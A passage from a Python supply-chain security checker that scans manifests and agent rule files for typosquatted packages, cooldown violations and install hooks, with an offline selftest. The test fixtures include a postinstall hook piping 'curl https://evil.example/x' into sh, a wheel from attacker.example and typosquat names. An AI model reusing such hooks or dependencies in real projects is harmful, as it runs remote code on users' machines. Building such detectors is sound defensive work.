MANIFEST_RE = re.compile(r'(package(-lock)?\.json|npm-shrinkwrap\.json|pnpm-lock\.yaml|yarn\.lock|requirements.*\.txt|pyproject\.toml|poetry\.lock|uv\.lock|Pipfile(\.lock)?|setup\.py|setup\.cfg)$')
# 有 manifest 樣式但尚無解析器的檔：其中的套件無法逐一檢查 → incomplete（不是 pass；以前 Pipfile／setup.py 根本不被當 manifest）
UNPARSED_RE = re.compile(r'(pnpm-lock\.yaml|yarn\.lock|Pipfile(\.lock)?|setup\.py|setup\.cfg)$')
# 全量掃描（--target、非 git 目錄）時略過的目錄：安裝產物與快取，不是專案宣告的相依
SKIP_DIRS = {".git", "node_modules", ".venv", "venv", "__pycache__", ".tox", ".mypy_cache", ".pytest_cache", "dist", "build"}

def discover(target):
    """列出目標專案的所有 manifest 與 agent 規則檔（相對目標根目錄）。git repo 取追蹤中的檔案，否則走訪目錄。"""
    try:
        r = subprocess.run(["git", "ls-files", "-z"], capture_output=True, text=True, cwd=target)
        files = [f for f in r.stdout.split("\0") if f] if r.returncode == 0 else None
    except OSError:
        files = None
    if files is None:
        files = []
        for d, dirs, names in os.walk(target):
            dirs[:] = [x for x in dirs if x not in SKIP_DIRS]
            files += [Path(d, n).relative_to(target).as_posix() for n in names]
    return sorted(files)
RULE_FILE_NAMES = (".cursorrules", "AGENTS.md", "SKILL.md")
# 安裝指令中「後面接一個值」的旗標：緊接在這類旗標後的是檔案、路徑、URL 或設定值，不是套件名
# （pip install -r requirements.txt、-e git+https://…、-i https://…）。只列文件明載需要值的旗標，以免把真正的套件漏掉。
VALUE_FLAGS = {
    "npm": {"--prefix", "--registry", "--tag", "-w", "--workspace", "--cache", "--userconfig", "--omit", "--include",
            "--install-strategy", "--before", "--otp", "--loglevel", "--filter", "-F", "--dir", "-C", "--cwd"},
    "pypi": {"-r", "--requirement", "-c", "--constraint", "-e", "--editable", "-i", "--index-url", "--extra-index-url",
             "-f", "--find-links", "-t", "--target", "--prefix", "--root", "--src", "--trusted-host", "--python", "-p",
             "--platform", "--python-version", "--implementation", "--abi", "--only-binary", "--no-binary",
             "--upgrade-strategy", "-C", "--config-settings", "--global-option", "--proxy", "--retries", "--timeout",
             "--exists-action", "--cert", "--client-cert", "--cache-dir", "--log", "--report", "--progress-bar",
             "--root-user-action", "--keyring-provider", "--group", "--suffix", "--pip-args", "--preinstall"},
}
INSTALL_RE = {
    "npm": re.compile(r'\b(?:npm|pnpm|yarn)\s+(?:install|add|i)\s+((?:-{1,2}[A-Za-z-]+\s+)*)([@A-Za-z0-9][@A-Za-z0-9._/-]*)'),
    "pypi": re.compile(r'\b(?:pip3?|pipx|uv\s+pip)\s+install\s+((?:-{1,2}[A-Za-z-]+\s+)*)([A-Za-z0-9][A-Za-z0-9._-]*)'),
}

def is_rule_file(path):
    name = Path(path).name
    return name in RULE_FILE_NAMES or name.endswith(".md")

def rule_file_mentions(path):
    """agent 規則檔／markdown 中 `npm install X`、`pip install X` 提及的套件（不含 `from X import`：模組名不等於套件名）。"""
    try:
        text = Path(path).read_text(errors="ignore")
    except OSError:
        return []
    out = []
    for eco, rx in INSTALL_RE.items():
        for m in rx.finditer(text):
            flags = m.group(1).split()
            if flags and flags[-1] in VALUE_FLAGS[eco]:
                continue                    # 例如 pip install -r requirements.txt：名稱位置是旗標的值
            # 同一行可能裝多個套件（pip install requests fastapi-auth-helperz）：第一個之後的也要查（第四次審視 S-10）
            line_end = text.find("\n", m.end())
            rest = text[m.end():line_end if line_end >= 0 else len(text)]
            for tok in [m.group(2)] + rest.split():
                if tok.startswith("-") or tok in ("&&", "||", ";", "|", ">", "<", "\\"):
                    break
                name = _install_token_name(eco, tok.rstrip(".,;:)`'\""))
                if not name:
                    break
                out.append((eco, name, None))
    return list(dict.fromkeys(out))         # 同一個檔提到同一個套件多次只算一次

NAME_RE = {"npm": re.compile(r'^[@A-Za-z0-9][@A-Za-z0-9._/-]*$'), "pypi": re.compile(r'^[A-Za-z0-9][A-Za-z0-9._-]*$')}

def _install_token_name(eco, tok):
    """install 指令中的一個參數 → 套件名（去掉版本），不像套件名回傳 None。"""
    if not tok or tok.startswith(("-", ".", "/")):
        return None
    if eco == "npm":
        if tok.count("@") > (1 if tok.startswith("@") else 0):
            tok = tok.rsplit("@", 1)[0]
    else:
        tok = re.split(r'[=<>!~\[]', tok, 1)[0]
    return tok if NAME_RE[eco].match(tok) else None

def git_show(ref, path):
    """回傳 ref 版本的檔案內容；不存在（新檔）回傳 None。"""
    try:
        r = subprocess.run(["git", "show", f"{ref}:./{rel_path(path)}"], capture_output=True, text=True, cwd=TARGET)
        return r.stdout if r.returncode == 0 else None
    except Exception:
        return None

def added_packages(path, base):
    """diff-aware：只回傳相對 base 新增或改版的 (eco, name, version)。base 為 None 時回傳全部。"""
    head = parse_added([path])
    if not base:
        return head
    old_text = git_show(base, path)
    if old_text is None:
        return head
    import tempfile
    with tempfile.TemporaryDirectory() as d:
        old = Path(d) / Path(path).name
        old.write_text(old_text)
        before = {(e, n.lower(), v) for e, n, v in parse_added([old])}
    return [(e, n, v) for e, n, v in head if (e, n.lower(), v) not in before]

LEVEL = {"blocking": "error", "advisory": "warning"}

def write_sarif(path, findings):
    rules, results = {}, []
    for f in findings:
        rules.setdefault(f["rule_id"], {"id": f["rule_id"], "name": f["rule_id"],
                                        "shortDescription": {"text": f["rule_id"]},
                                        "properties": {"policy_tier": f["policy_tier"]}})
        results.append({
            "ruleId": f["rule_id"],
            "level": LEVEL.get(f["policy_tier"], "warning"),
            "message": {"text": f"[{f['ecosystem']}] {f['package']}@{f['version'] or '?'} — {f['reason']}"},
            "locations": [{"physicalLocation": {"artifactLocation": {"uri": f.get("manifest") or "unknown"}}}],
            "partialFingerprints": {"vibesecPackage": f"{f['rule_id']}|{f['ecosystem']}|{f['package'].lower()}|{f.get('manifest')}"},
            "properties": {k: f.get(k) for k in ("package", "ecosystem", "version", "policy_tier", "manifest")}
                          | ({"exception": f["exception"]} if f.get("exception") else {})
                          | ({"allowlist": f["allowlist"]} if f.get("allowlist") else {}),
        })
    sarif = {"$schema": "https://json.schemastore.org/sarif-2.1.0.json", "version": "2.1.0",
             "runs": [{"tool": {"driver": {"name": "vibesec-slopcheck", "version": "2.0.0",
                                           "informationUri": "https://github.com/chinchiang/MultiAgentDelta",
                                           "rules": list(rules.values())}},
                       "results": results}]}
    Path(path).parent.mkdir(parents=True, exist_ok=True)
    Path(path).write_text(json.dumps(sarif, ensure_ascii=False, indent=2), encoding="utf-8")

CONTROL_OF = {
    "vibesec.g1.hallucinated-package": "VS-G1-SLOPSQUAT",
    "vibesec.g1.rules-file-unknown-package": "VS-G1-SLOPSQUAT",
    "vibesec.g1.low-download-package": "VS-G1-SLOPSQUAT",
    "vibesec.g1.cooldown-violation": "VS-G1-COOLDOWN",
    "vibesec.g1.postinstall-egress": "VS-G1-INSTALL-HOOK",
}

def write_gate(path, findings, incomplete, started, base, scope, sarif_ref, notes=(), pypi_checked=0):
    vb = read_vibesec() or {}
    mode = vb.get("mode", "shadow"); tier = vb.get("risk_tier", "L2")
    blocking = sum(f["policy_tier"] == "blocking" for f in findings)
    advisory = sum(f["policy_tier"] == "advisory" for f in findings)
    if incomplete:
        status, reason = "incomplete", "；".join(list(incomplete) + list(notes))
    else:
        status, reason = ("fail" if blocking else "pass"), ("；".join(notes) or None)
    coverage = []
    for ctl in ("VS-G1-SLOPSQUAT", "VS-G1-COOLDOWN", "VS-G1-INSTALL-HOOK"):
        hit = [f for f in findings if CONTROL_OF.get(f["rule_id"]) == ctl and f["policy_tier"] == "blocking"]
        if incomplete:
            state, why = "untested", None
        elif hit:
            state, why = "fail", None
        elif ctl == "VS-G1-INSTALL-HOOK" and pypi_checked:
            # PyPI 的安裝腳本（setup.py／build hooks）尚無檢查，只查了 npm scripts：不能報 pass（第四次審視 D-4）
            state, why = "untested", f"{pypi_checked} 個 PyPI 套件的安裝腳本尚無檢查（只檢查 npm scripts）"
        else:
            state, why = "pass", None
        coverage.append({"control_id": ctl, "state": state, "reason": why})
    coverage.append({"control_id": "VS-G1-SBOM", "state": "pending", "reason": None})
    try:
        commit = subprocess.run(["git", "rev-parse", "HEAD"], capture_output=True, text=True, cwd=TARGET).stdout.strip() or None
    except Exception:
        commit = None
    gate = {"gate": "G1", "status": status, "status_reason": reason, "mode": mode, "risk_tier": tier,
            "scope": scope, "diff_base": base, "commit": commit,
            "started_at": started, "finished_at": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
            "tools": [{"name": "vibesec-slopcheck", "version": "2.0.0", "state": "ran", "exit_code": None,
                       "output_ref": sarif_ref, "duration_seconds": None}],
            "findings_count": {"blocking": blocking, "advisory": advisory},
            "coverage": coverage}
    Path(path).parent.mkdir(parents=True, exist_ok=True)
    Path(path).write_text(json.dumps(gate, ensure_ascii=False, indent=2), encoding="utf-8")

def _opt(args, name):
    """收集重複出現的 `--name value` 參數。"""
    return [args[i + 1] for i, a in enumerate(args[:-1]) if a == name]

def selftest():
    """離線自我測試 --target：registry 查詢以替身取代，只驗證路徑、全量探索、鎖定檔與例外範圍。"""
    import contextlib, io, tempfile
    from jsonschema import Draft202012Validator
    global TARGET, npm_check, pypi_check, pypi_requires, load_exceptions, load_allowlist, _https_only_opener, BACKOFF
    fails = []
    schema = Draft202012Validator(json.loads((ROOT / "schemas/gate-result.schema.json").read_text(encoding="utf-8")))
    real = (npm_check, pypi_check, pypi_requires, load_exceptions, load_allowlist)
    real_allowlist = load_allowlist
    allow = []                                  # 整合測試用的合成 allowlist（不依賴政策檔現有條目與到期日）
    load_allowlist = lambda path=None, today=None: (list(allow), [])
    calls = []
    def stub(pkg, ver, c):
        calls.append((pkg, ver))
        return [fnd("vibesec.g1.cooldown-violation", pkg, "pypi", ver, "selftest 替身", "blocking")], None
    npm_check = pypi_check = stub
    requires_of = {}                            # 合成的 PyPI requires_dist（名稱小寫 → 相依名稱）
    pypi_requires = lambda pkg, ver: set(requires_of.get(pkg.lower(), ()))
    # 合成例外（不依賴政策檔現有例外與其到期日）
    load_exceptions = lambda today=None: ([{"rule_id": "vibesec.g1.cooldown-violation", "path_glob": "examples/vulnapp/**",
                                            "reason": "selftest", "approved_by": "selftest", "expires": "2099-12-31"}], [])

    def run(*argv):
        global TARGET
        out, err = io.StringIO(), io.StringIO()
        try:
            with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
                code = main(["g1_slopcheck.py", *argv])
        finally:
            TARGET = ROOT
        return code, (json.loads(out.getvalue()) if out.getvalue().strip() else {})

    def git(d, *a):
        subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", *a], cwd=d, capture_output=True, check=True)

    try:
        # PEP 503：PyPI 的 _ / . / 大小寫與 - 是同一個專案；npm 不正規化；真正的拼錯仍要抓到
        c = {"similarity": 0.80}
        for name in ("typing_extensions", "Typing.Extensions", "TYPING-extensions"):
            if similarity_check(name, "pypi", {"typing-extensions"}, {}, c):
                fails.append(f"PyPI {name} 與 typing-extensions 是同一個專案（PEP 503），不得判 typosquat")
        if not similarity_check("typing-extensionz", "pypi", {"typing-extensions"}, {}, c):
            fails.append("PyPI typing-extensionz 仍要判 typosquat")
        if not similarity_check("left_pad", "npm", {"left-pad"}, {}, c):
            fails.append("npm 的 left_pad 與 left-pad 是不同套件，不做 PEP 503 正規化")
        # 編輯距離：相鄰易位算 1 次；5 個字元以內只認 1 次編輯，較長的名稱認到 2 次
        for name, good, want in (("axois", "axios", True), ("numpyy", "numpy", True), ("pnadsa", "pandas", True),
                                 ("zipp", "pip", False), ("hpack", "black", False), ("pyrit", "pyjwt", False)):
            if bool(similarity_check(name, "pypi", {good}, {}, {"similarity": 0.99})) != want:
                fails.append(f"{name} 對 {good}：{'應' if want else '不應'}判 typosquat（距離 {_edit_distance(name, good)}）")
        bl = {("pypi", "foo-bar"): {"reason": "t"}, (None, "baz_qux"): {"reason": "u"}}
        if not lookup(bl, "pypi", "Foo_Bar") or not lookup(bl, "pypi", "baz.qux") or lookup(bl, "npm", "baz-qux"):
            fails.append("黑名單／允許清單查詢：PyPI 依 PEP 503 比對，npm 只比對小寫")
        # allowlist：只採用合規未過期的條目；逐筆發現放行 bypass 列出的檢查；安裝 hook 永不放行
        with tempfile.TemporaryDirectory() as d:
            al = Path(d) / "allowlist.yaml"
            base = {"approved_by": "a@x", "expires": "2026-12-31", "reason": "r"}
            entries = [
                dict(base, package="ok-range", ecosystem="npm", version=">=2.0.0 <3.0.0", bypass=["cooldown"]),
                dict(base, package="Typing_Ext", ecosystem="pypi", version="==1.0.0", bypass=["similarity", "low_download"]),
                dict(base, package="no-approver", bypass=["cooldown"], approved_by=None),
                dict(base, package="expired", bypass=["cooldown"], expires="2026-01-01"),
                dict(base, package="hooky", bypass=["install_hook"]),
                dict(base, package="caret", version="^1.2.0", bypass=["cooldown"]),
                dict(base, package="bad-date", bypass=["cooldown"], expires="next week"),
            ]
            import yaml as _yaml
            al.write_text(_yaml.safe_dump({"version": 1, "entries": entries}), encoding="utf-8")
            valid, ignored = real_allowlist(al, today=date(2026, 10, 6))
            if sorted(e["package"] for e in valid) != ["Typing_Ext", "ok-range"] or len(ignored) != 5:
                fails.append(f"allowlist 載入：讀 entries、缺欄位／過期／bypass 不可放行／version 無法解析／日期無效 → 忽略並回報"
                             f"（有效 {[e['package'] for e in valid]}，忽略 {ignored}）")
            if not any("install_hook" in x for x in ignored) or not any("過期" in x for x in ignored):
                fails.append(f"allowlist 被忽略的理由要寫明（得到 {ignored}）")
            al.write_text(_yaml.safe_dump({"packages": [entries[0]]}), encoding="utf-8")
            if [e["package"] for e in real_allowlist(al, today=date(2026, 10, 6))[0]] != ["ok-range"]:
                fails.append("allowlist 舊格式（packages:）也要讀")
        spec = parse_version_spec
        for sp, ver, want in [(None, None, True), ("2.32.5", "2.32.5", True), ("==2.32.5", "2.32.6", False),
                              (">=2.0.0 <3.0.0", "2.5.1", True), (">= 2.0, < 3", "3.0.0", False), (">=2.0.0", None, False),
                              (">=2.0.0 <3.0.0", "2.5.0-beta.1", False), ("1.2.3", "v1.2.3", True)]:
            if version_matches(spec(sp), ver) != want:
                fails.append(f"version_matches({sp!r}, {ver!r}) 應為 {want}")
        ents = [{"package": "ok-range", "ecosystem": "npm", "spec": spec(">=2.0.0 <3.0.0"), "bypass": {"cooldown"},
                 "approved_by": "a@x", "expires": "2026-12-31", "ticket": "SEC-1", "reason": "r"},
                {"package": "Typing_Ext", "ecosystem": "pypi", "spec": spec("1.0.0"), "bypass": {"similarity"},
                 "approved_by": "a@x", "expires": "2026-12-31", "ticket": None, "reason": "r"}]
        f = apply_allowlist(fnd("vibesec.g1.cooldown-violation", "ok-range", "npm", "2.1.0", "t", "blocking"), ents)
        if f["policy_tier"] != "advisory" or (f.get("allowlist") or {}).get("ticket") != "SEC-1":
            fails.append("allowlist：bypass 含 cooldown、版本在範圍內 → cooldown 發現降為 advisory 並附核准資訊")
        for f, why in [(fnd("vibesec.g1.cooldown-violation", "ok-range", "npm", "3.0.0", "t", "blocking"), "版本不在範圍"),
                       (fnd("vibesec.g1.postinstall-egress", "ok-range", "npm", "2.1.0", "t", "blocking"), "安裝 hook 永不放行"),
                       (fnd("vibesec.g1.hallucinated-package", "ok-range", "npm", "2.1.0", "t", "blocking", "registry_health"),
                        "bypass 沒列 registry_health"),
                       (fnd("vibesec.g1.cooldown-violation", "ok-range", "pypi", "2.1.0", "t", "blocking"), "生態系不同")]:
            if apply_allowlist(f, ents)["policy_tier"] != "blocking" or f.get("allowlist"):
                fails.append(f"allowlist 不得放行：{why}")
        f = apply_allowlist(fnd("vibesec.g1.hallucinated-package", "typing-ext", "pypi", None, "t", "blocking", "similarity"), ents, "1.0.0")
        if f["policy_tier"] != "advisory":
            fails.append("allowlist：名稱依 PEP 503 比對；發現沒有版本時以套件版本比對 version")
        # http_json：截斷／連線錯誤重試後成功；404 不重試；一直失敗就拋出（呼叫端記 incomplete）
        class _Resp:
            def __enter__(self): return self
            def __exit__(self, *a): return False
            def read(self): return b'{"ok": 1}'
        class _Flaky:
            def __init__(self, errs): self.errs, self.n, self.reqs = list(errs), 0, []
            def open(self, req, timeout=None):
                self.n += 1
                self.reqs.append(req)
                if self.errs:
                    raise self.errs.pop(0)
                return _Resp()
        real_net = (_https_only_opener, BACKOFF)
        BACKOFF = 0
        try:
            not_found = lambda: urllib.error.HTTPError("https://x", 404, "nf", {}, None)
            for errs, want_ok, want_n, why in [
                ([http.client.IncompleteRead(b"x", 5), ConnectionResetError()], True, 3, "傳輸截斷、連線中斷 → 重試後成功"),
                ([not_found()], False, 1, "404 不重試"),
                ([TimeoutError()] * (RETRIES + 1), False, RETRIES + 1, "重試用完仍失敗 → 拋出"),
            ]:
                fl = _Flaky(errs)
                _https_only_opener = lambda: fl
                try:
                    ok = http_json("https://example.invalid/x") == {"ok": 1}
                except Exception:
                    ok = False
                if ok != want_ok or fl.n != want_n:
                    fails.append(f"http_json：{why}（成功={ok}，呼叫 {fl.n} 次）")
                if len({id(r) for r in fl.reqs}) != len(fl.reqs):
                    fails.append(f"http_json：{why}——重試重用了同一個 Request（ProxyHandler 會改寫它）")
        finally:
            _https_only_opener, BACKOFF = real_net
        # 真的經過 http:// proxy（本機已關閉的埠 → 連線被拒）：每次嘗試都必須是同一種錯誤，
        # 不能在重試時變成「unknown url type: http」（Request 被 ProxyHandler 改寫後重用的症狀）
        import socket
        with socket.socket() as s_:
            s_.bind(("127.0.0.1", 0)); dead = s_.getsockname()[1]
        saved = {k: os.environ.pop(k) for k in list(os.environ) if k.lower() in ("https_proxy", "http_proxy", "all_proxy", "no_proxy")}
        os.environ["https_proxy"] = f"http://127.0.0.1:{dead}"
        BACKOFF = 0
        try:
            http_json("https://registry.npmjs.org/left-pad")
            fails.append("http_json 經已關閉的 proxy 不應成功")
        except Exception as e:
            if "unknown url type" in str(e):
                fails.append(f"http_json 經 http:// proxy 重試時 Request 被改寫：{e}")
        finally:
            os.environ.pop("https_proxy", None); os.environ.update(saved)
            BACKOFF = real_net[1]
        with tempfile.TemporaryDirectory() as d:
            rf = Path(d) / "AGENTS.md"
            rf.write_text("pip install -r requirements.lock.txt\n`pip install -e git+https://example.com/x.git`\n"
                          "uv pip install --index-url https://pypi.org/simple foo\npip install --requirement req.txt\n"
                          "npm install --registry https://r.example.com bar\npip install -U fastapi-auth-helperz\n"
                          "npm install -D left-pad\nRun `pip install requests`, then `pip install requests` again.\n",
                          encoding="utf-8")
            got = rule_file_mentions(rf)
            want = [("npm", "left-pad", None), ("pypi", "fastapi-auth-helperz", None), ("pypi", "requests", None)]
            if sorted(got) != want:
                fails.append(f"規則檔：帶值旗標（-r、-e、--index-url、--registry）的值不是套件名，重複提及只算一次（得到 {got}）")
        with tempfile.TemporaryDirectory() as d:
            D = Path(d)
            (D / "examples/vulnapp").mkdir(parents=True)
            (D / "examples/vulnapp/requirements.txt").write_text("requests==2.0.0\n")
            (D / "deploy").mkdir()
            (D / "deploy/python-requirements.txt").write_text("fastapi==0.1.0 \\\n    --hash=sha256:00\n")
            (D / "frontend").mkdir()
            (D / "frontend/yarn.lock").write_text("# yarn lockfile v1\n")
            (D / "README.md").write_text("沒有安裝指令。\n")
            (D / "node_modules/x").mkdir(parents=True)
            (D / "node_modules/x/package.json").write_text('{"dependencies": {"evil": "1.0.0"}}')
            git(D, "init", "-q"); git(D, "add", "examples", "deploy", "frontend", "README.md"); git(D, "commit", "-qm", "t")
            files = discover(D)
            if "node_modules/x/package.json" in files or "deploy/python-requirements.txt" not in files:
                fails.append(f"git repo 的全量探索只取追蹤中的檔案（得到 {files}）")
            gate = D.parent / f"{D.name}-gate.json"
            code, out = run("--target", str(D), "--gate", str(gate))
            pkgs = {f["package"]: f for f in out.get("findings", [])}
            if set(pkgs) != {"requests", "fastapi"}:
                fails.append(f"只給 --target → 全量掃描 requirements（含 python-requirements.txt），不掃 node_modules（得到 {sorted(pkgs)}）")
            if pkgs.get("requests", {}).get("policy_tier") != "blocking" or "exception" in pkgs.get("requests", {}):
                fails.append("外部目標：本 repo 的 examples/vulnapp/** 例外不得套用（仍為 blocking）")
            if pkgs.get("fastapi", {}).get("manifest") != "deploy/python-requirements.txt":
                fails.append("manifest 路徑相對目標專案根目錄")
            if code != 1 or out.get("status") != "incomplete" or "frontend/yarn.lock" not in out.get("status_reason", ""):
                fails.append(f"尚無解析器的鎖定檔 → incomplete 並列出檔名（exit {code}，{out.get('status_reason')}）")
            g = json.loads(gate.read_text(encoding="utf-8"))
            gate.unlink()
            errs = list(schema.iter_errors(g))
            if errs:
                fails.append(f"gate JSON 不符 schema：{errs[0].message}")
            head = subprocess.run(["git", "rev-parse", "HEAD"], capture_output=True, text=True, cwd=D).stdout.strip()
            if g.get("commit") != head or g.get("scope") != "full" or "exceptions" not in (g.get("status_reason") or ""):
                fails.append("gate JSON 的 commit 取目標專案 HEAD、scope full、status_reason 註明例外未套用")
            # package-lock.json v3：別名取實名、略過 workspace 連結、非 registry 來源回報、間接相依不做名稱相似度
            reg = lambda n, v: f"https://registry.npmjs.org/{n}/-/{n.split('/')[-1]}-{v}.tgz"
            lock = {"lockfileVersion": 3, "packages": {
                "": {"dependencies": {"playwrite": "1.0.0", "strip-cjs": "npm:strip-ansi@6.0.1"}},
                "node_modules/playwrite": {"version": "1.0.0", "resolved": reg("playwrite", "1.0.0")},
                "node_modules/playwright-core": {"version": "1.63.0", "resolved": reg("playwright-core", "1.63.0")},
                "node_modules/loadsh": {"version": "0.0.4", "resolved": reg("loadsh", "0.0.4")},
                "node_modules/strip-cjs": {"name": "strip-ansi", "version": "6.0.1", "resolved": reg("strip-ansi", "6.0.1")},
                "node_modules/a/node_modules/strip-ansi": {"version": "6.0.1", "resolved": reg("strip-ansi", "6.0.1")},
                "node_modules/gitdep": {"version": "1.0.0", "resolved": "git+ssh://git@github.com/x/gitdep.git#abc"},
                "node_modules/ws-local": {"resolved": "packages/ws-local", "link": True},
                "packages/ws-local": {"version": "0.1.0"}}}
            (D / "web").mkdir()
            (D / "web/package-lock.json").write_text(json.dumps(lock))
            entries, bad = npm_lock(D / "web/package-lock.json")
            if sorted(entries) != [("loadsh", "0.0.4", False), ("playwright-core", "1.63.0", False), ("playwrite", "1.0.0", True),
                                   ("strip-ansi", "6.0.1", False), ("strip-ansi", "6.0.1", True)] or bad != ["node_modules/gitdep"]:
                fails.append(f"package-lock v3 解析（得到 {sorted(entries)}，無法驗證 {bad}）")
            v1 = {"lockfileVersion": 1, "dependencies": {
                "left-pad": {"version": "1.3.0", "resolved": reg("left-pad", "1.3.0"),
                             "dependencies": {"ms": {"version": "2.1.3", "resolved": reg("ms", "2.1.3")}}},
                "sc": {"version": "npm:@scope/real@2.0.0", "resolved": reg("@scope/real", "2.0.0")},
                "vendored": {"version": "file:vendor/v.tgz"}}}
            (D / "old").mkdir()
            (D / "old/package-lock.json").write_text(json.dumps(v1))
            (D / "old/package.json").write_text('{"dependencies": {"left-pad": "^1.3.0"}}')
            entries, bad = npm_lock(D / "old/package-lock.json")
            if sorted(entries) != [("@scope/real", "2.0.0", False), ("left-pad", "1.3.0", True), ("ms", "2.1.3", False)] or bad != ["vendored"]:
                fails.append(f"package-lock v1 解析（得到 {sorted(entries)}，無法驗證 {bad}）")
            calls.clear()
            code, out = run("--target", str(D), "--manifest", "web/package-lock.json")
            hall = {f["package"] for f in out.get("findings", []) if f["rule_id"] == "vibesec.g1.hallucinated-package"}
            if hall != {"playwrite", "loadsh"}:
                fails.append(f"直接相依做名稱相似度、間接相依只查黑名單（hallucinated 得到 {sorted(hall)}）")
            if sorted(calls) != [("loadsh", "0.0.4"), ("playwright-core", "1.63.0"), ("playwrite", "1.0.0"), ("strip-ansi", "6.0.1")]:
                fails.append(f"registry 每個 (名稱, 版本) 只查一次、間接相依也要查（得到 {sorted(calls)}）")
            if out.get("status") != "incomplete" or "node_modules/gitdep" not in out.get("status_reason", ""):
                fails.append("非 npm registry 來源的條目 → incomplete 並列出")
            allow[:] = [{"package": "fastapi", "ecosystem": "pypi", "spec": parse_version_spec("0.1.0"), "bypass": {"cooldown"},
                         "approved_by": "a@x", "expires": "2099-12-31", "ticket": "SEC-9", "reason": "selftest"}]
            calls.clear()
            code, out = run("--target", str(D), "--manifest", "deploy/python-requirements.txt")
            allow.clear()
            fa = [f for f in out.get("findings", []) if f["package"] == "fastapi"]
            if calls != [("fastapi", "0.1.0")] or [f["policy_tier"] for f in fa] != ["advisory"] or code != 0:
                fails.append(f"allowlist 內的套件仍要查 registry，放行的發現降為 advisory（查詢 {calls}，發現 {fa}，exit {code}）")
            # requirements 鎖定檔：由同檔其他套件宣告為相依者是間接相依，不做名稱相似度；沒有人需要的仍要比對
            (D / "py").mkdir()
            (D / "py/requirements.lock.txt").write_text("openai==2.0.0 \\\n    --hash=sha256:00\nhttpx2==2.13.1\n"
                                                        "reqursts==1.0.0\nlanggraph==1.0.0\nlanggraph-sdk==0.4.5\n")
            requires_of.update({"openai": {"httpx2", "openai"}, "langgraph": {"langgraph-sdk"}, "reqursts": {"reqursts"}})
            code, out = run("--target", str(D), "--manifest", "py/requirements.lock.txt")
            hall = {f["package"] for f in out.get("findings", []) if f["rule_id"] == "vibesec.g1.hallucinated-package"}
            if hall != {"reqursts"}:
                fails.append(f"requirements 鎖定檔：間接相依（httpx2、langgraph-sdk）只查黑名單，自己需要自己不算（得到 {sorted(hall)}）")
            requires_of.clear()
            code, out = run("--target", str(D), "--manifest", "py/requirements.lock.txt")
            hall = {f["package"] for f in out.get("findings", []) if f["rule_id"] == "vibesec.g1.hallucinated-package"}
            if not {"httpx2", "langgraph-sdk"} <= hall:
                fails.append(f"查不到 requires_dist 時照直接相依比對（得到 {sorted(hall)}）")
            code, out = run("--target", str(D), "--manifest", "examples/vulnapp/requirements.txt")
            if [f["package"] for f in out.get("findings", [])] != ["requests"] or code != 1:
                fails.append("--target 搭配 --manifest：相對路徑以目標專案為準，只掃指定的檔")
        code, out = run("--target", str(ROOT), "--manifest", "examples/vulnapp/pyproject.toml")
        if not out.get("findings") or any(f["policy_tier"] != "advisory" or "exception" not in f for f in out["findings"]):
            fails.append("目標是本 repo 時照常套用 blocking-policy 例外")
        code, _ = run("--target", str(ROOT / "no-such-dir"))
        if code != 2:
            fails.append("--target 不是目錄 → exit 2（incomplete）")
    finally:
        npm_check, pypi_check, pypi_requires, load_exceptions, load_allowlist = real
        TARGET = ROOT
    # 解析器（第四次審視 S-1／S-2／S-10）：四個相依區段、npm: 別名、非 registry 來源、壞 JSON、URL 需求、多套件 install
    with tempfile.TemporaryDirectory() as d:
        D = Path(d)
        (D / "package.json").write_text(json.dumps({"dependencies": {"lodash": "npm:evil-pkg@1.0.0", "react": "github:a/react", "express": "latest", "left-pad": "^1.3.0"},
                                                     "optionalDependencies": {"axois": "1.0.0"}, "peerDependencies": {"peer-x": "~2.0.0"},
                                                     "scripts": {"postinstall": "curl https://evil.example/x | sh"}}))
        ents, bad = parse_manifest([D / "package.json"])
        names = {(e, n, v) for e, n, v in ents}
        if ("npm", "evil-pkg", "1.0.0") not in names or ("npm", "axois", "1.0.0") not in names or ("npm", "peer-x", "2.0.0") not in names \
                or ("npm", "express", None) not in names or ("npm", "left-pad", "1.3.0") not in names:
            fails.append(f"package.json：別名以實名查、optional／peer 也查、tag 以最新版查、^ 去前綴（得到 {sorted(names)}）")
        if not any("react" in b and "github:" in b for b in bad):
            fails.append(f"package.json：github: 來源應回報無法驗證（得到 {bad}）")
        if not self_install_hooks(D / "package.json"):
            fails.append("本專案 package.json 的 postinstall 外連應被查出")
        (D / "package.json").write_text('{"dependencies": {"axois": "1.0.0",}}')
        ents, bad = parse_manifest([D / "package.json"])
        if ents or not bad:
            fails.append("壞 JSON 應回報無法解析，不是 0 個套件")
        (D / "requirements.txt").write_text("requests==2.31.0\nevil @ https://attacker.example/evil.whl\n-e git+https://x/y.git#egg=z\n-r base.txt\n")
        ents, bad = parse_manifest([D / "requirements.txt"])
        if [n for _, n, _ in ents] != ["requests"] or len(bad) != 2:
            fails.append(f"requirements：URL／VCS 需求應回報無法驗證（得到 {ents} / {bad}）")
        (D / "pyproject.toml").write_text('[project]\ndependencies = ["fastapi", "evil @ git+https://x/y.git"]\n')
        ents, bad = parse_manifest([D / "pyproject.toml"])
        if [n for _, n, _ in ents] != ["fastapi"] or len(bad) != 1:
            fails.append(f"pyproject：URL 需求應回報無法驗證（得到 {ents} / {bad}）")
        (D / "pyproject.toml").write_text('[project\nbroken')
        if parse_manifest([D / "pyproject.toml"]) != ([], ["pyproject.toml: TOML 無法解析（或 tomllib 缺席）"]):
            fails.append("壞 TOML 應回報無法解析")
        (D / "AGENTS.md").write_text("先 pip install requests fastapi-auth-helperz --upgrade\n再 npm install express axois@1.2 && npm run x\n")
        ment = {(e, n) for e, n, _ in rule_file_mentions(D / "AGENTS.md")}
        if ment != {("pypi", "requests"), ("pypi", "fastapi-auth-helperz"), ("npm", "express"), ("npm", "axois")}:
            fails.append(f"規則檔同一行多個套件都要查（得到 {sorted(ment)}）")
        if not MANIFEST_RE.search("Pipfile") or not UNPARSED_RE.search("setup.py") or not MANIFEST_RE.search("npm-shrinkwrap.json"):
            fails.append("Pipfile／setup.py 應被當成尚無解析器的 manifest；npm-shrinkwrap 應被當成鎖定檔")

    return fails

def main(argv):
    global TARGET
    args = argv[1:]
    if args[:1] == ["selftest"]:
        fails = selftest()
        for f in fails:
            print(f"FAIL {f}")
        print("selftest " + ("通過" if not fails else f"失敗 {len(fails)} 項"))
        return 1 if fails else 0
    started = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    target = (_opt(args, "--target") or [None])[-1]
    if target:
